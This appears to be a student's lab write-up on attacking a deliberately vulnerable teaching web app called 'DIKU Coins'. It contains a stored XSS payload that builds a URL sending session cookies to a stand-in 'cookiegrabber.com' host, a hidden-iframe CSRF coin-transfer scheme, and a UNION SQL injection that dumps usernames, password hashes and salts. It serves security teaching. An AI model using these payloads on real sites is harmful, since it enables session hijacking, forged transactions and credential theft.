Week 1 - Web
============


Part 1: Black Box Assessment
----------------------------

## Attack A. Cookie Theft

The cookie theft is done by writing up in the message input the following line message:

	`Any message we want</p>
	<SCRIPT type="text/javascript">
		var adr = "http://www.cookiegrabber.com/evil.php?cookie=" + escape(document.cookie);
	</SCRIPT>
	<p>`

Because the form inputs are not sanitised or checked in any way by the server we can save the message in the databese like it is. If in a Second-Order SQL Injection the data stored in database is later used to conduct SQL injection, In this case we might say that this is a Second-Order cookie hijacking because we get the session token when the user clicks on our message and renders the HTML page with our script. Stored Cross-site Scripting (XSS) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack.

## Attack B. Cross-Site Request Forgery

In the transfer page we have this form for transfering coins:

	`<form method="POST" name="transferform" action="/transfer.php">
		<p>Send <input name="coins" value="" size="10" type="text"> DIKU Coins</p>
		<p>to <input name="recipient" value="" type="text"></p>
		<input name="submission" value="Send" type="submit">
	</form>`

We will need to modify this form and place it into our malicious webpage. The solution for type of attack can be found in the `malicious.html` docoument. We will add `you` to the value of the `recepient` input to transfer the coins from the logged in user. This form will reside in a hidden iframe and after we submit the form with a simple Javascript script we change the location of out webpage to `http://yesimparanoid.com`.

Part 2: White Box Assessment
----------------------------


## List of users

We will use some simple SQL injection to get what we want. This is done by inputting the following command in the `user.php` search field:

	'
	UNION ALL
	SELECT
		GROUP_CONCAT(Username, '|', DikuCoins, '|', Password, '|', Salt SEPARATOR '<br>') AS Profile,
		NULL as Username,
		NULL as DikuCoins
	FROM Person
	WHERE '1'='1

Because the SQL statepemt is written in plain text like so:

	```php
	$selecteduser = $_GET['user'];
	$sql = "SELECT Profile, Username, DikuCoins FROM Person " .
     "WHERE Username='$selecteduser'";
	```

This will create the following SQL statement:

	SELECT Profile, Username, DikuCoins FROM Person 
	WHERE Username=''
	UNION ALL
	SELECT
		GROUP_CONCAT(Username, '|', DikuCoins, '|', Password, '|', Salt SEPARATOR '<br>') AS Profile,
		NULL as Username,
		NULL as DikuCoins
	FROM Person
	WHERE '1'='1'


This will retreive everything we want to know about the users currently in the database. Unfortunately the passwords are hashed but we do have the hashes and salts available to us.


## Change password of br0ns